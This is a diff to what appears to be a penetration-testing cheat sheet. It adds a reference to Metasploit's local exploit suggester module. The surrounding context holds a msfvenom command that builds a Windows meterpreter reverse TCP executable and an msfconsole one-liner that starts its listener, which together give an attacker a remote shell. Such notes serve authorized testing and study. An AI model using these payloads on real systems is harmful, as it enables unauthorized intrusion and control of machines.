@@ -43,6 +43,7 @@
 		- [Meterpreter shell](#meterpreter-shell)
 		- [Generate tcp reverse shell](#generate-tcp-reverse-shell)
 		- [MSFConsol one line listener](#msfconsol-one-line-listener)
+		- [Suggester](#suggester)
 	- [LFI](#lfi)
 		- [Fuzz](#fuzz)
 		- [View php code](#view-php-code)
@@ -439,6 +440,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="1234" -f exe -
 ```bash
 sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT '1234'; exploit"
 ```
+
+### Suggester
+
+post/multi/recon/local_exploit_suggester
 
 ## LFI
 
